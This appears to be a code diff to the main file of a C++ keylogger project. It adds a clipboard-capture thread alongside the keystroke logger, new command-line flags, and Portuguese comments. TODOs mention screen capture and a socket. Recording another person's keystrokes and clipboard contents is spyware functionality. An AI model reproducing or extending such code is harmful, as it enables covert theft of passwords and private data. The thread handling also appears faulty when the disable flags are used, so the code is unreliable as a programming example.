@@ -1,20 +1,26 @@
 #include <iostream>
 #include <fstream>
 #include <thread>
-#include "Argumentation.h"
-#include "Logger.h"
-#include "Keylogger.h"
-#include "Presenter.h"
+#include "KSVArgumentation.h"
+#include "KSVLogger.h"
+#include "KSVKeylogger.h"
+#include "KSVPresenter.h"
+#include "KSVClipboard.h"
 
 int main(int argc, const char *args[]) {
     Argumentation *argumentation = new Argumentation(argc, args);
 
-    if (argumentation->hasArg((char *) "--version")) {
+    if (argumentation->hasArg((char *) "--version") || argumentation->hasArg((char *) "-v")) {
         Presenter::showVersion();
         exit(0);
     }
 
-    Presenter::showHeader();
+    if (argumentation->hasArg((char *) "--help") || argumentation->hasArg((char *) "-h")) {
+        Presenter::showHelp();
+        exit(0);
+    }
+
+//    Presenter::showHeader();
 
     Logger *logger = Logger::instance();
     bool useSameLogFile = true;
@@ -34,7 +40,7 @@ int main(int argc, const char *args[]) {
     if (std::ifstream(file)) {
         logger->i("Log file already exists");
 
-        if (argumentation->hasArg((char *) "--clear")) {
+        if (argumentation->hasArg((char *) "--clear") || argumentation->hasArg((char *) "-c")) {
             logger->i("Clearing log file!");
             useSameLogFile = false;
         } else {
@@ -63,15 +69,36 @@ int main(int argc, const char *args[]) {
     logger->line();
 
     Keylogger keylogger;
+    Clipboard clipboard;
 
-    std::thread thread[1];
+    std::thread thread[2];
     thread[0] = std::thread(keylogger);
+    thread[1] = std::thread(clipboard);
 
     // TODO - ScreenLogger
     // TODO - Socket
     // TODO - UI Mode
 
-    thread[0].join();
+
+    // Verifica se o clipboard deve ser ativado
+    if (!argumentation->hasArg((char *) "--disableClipboard")) {
+
+        // Inicia a execução da thread de forma independente, sem fazer com que o processo main espere.
+        thread[1].detach();
+    } else {
+        logger->w("CLIPBOARD DISABLED");
+    }
+
+
+    // Verifica se o keylogger deve ser ativado
+    if (!argumentation->hasArg((char *) "--disableKeylogger")) {
+
+        // Inicia a execucão do Keylogger e faz o processo main esperar.
+        thread[0].join();
+    } else {
+        logger->w("KEYLOGGER DISABLED");
+    }
+
 
     return 0;
 }
